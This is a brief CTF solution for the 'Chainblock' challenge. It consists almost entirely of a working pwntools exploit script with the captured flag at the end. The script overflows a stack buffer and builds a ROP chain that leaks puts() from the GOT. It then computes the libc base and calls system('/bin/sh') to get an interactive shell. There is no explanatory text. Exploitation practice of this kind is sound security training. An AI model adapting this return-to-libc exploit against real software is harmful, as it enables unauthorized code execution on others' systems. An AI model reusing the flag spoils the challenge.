# Chainblock

### Solution
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chainblock')
rop = ROP(elf)
libc = ELF('./libc.so.6')

p = elf.process()
#p = remote(pwn.be.ax, 5000)

p.recvuntil('name: ')

main_address = 0x40124b
puts_got_address = elf.got["puts"]
puts_plt_address = elf.plt["puts"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

payload = b'A' * 264 
payload += p64(pop_rdi) 
payload += p64(puts_got_address) 
payload += p64(puts_plt_address) 
payload += p64(main_address)

print(p.sendline(payload))
print(p.recvline())
leaked_output = p.recvline()[:-1]
print('leaked puts() address: ', leaked_output)

puts = u64((leaked_output + b"\x00\x00"))
libc_address = puts - libc.symbols['puts']
print("libc_address: ", hex(libc_address))

rop = ROP(libc)

system = libc_address + libc.symbols['system']
bin_sh = libc_address + next(libc.search(b"/bin/sh"))

payload = b'A' * 264 
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.clean()
p.sendline(payload)
p.interactive()
```

**Flag:** `corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}`
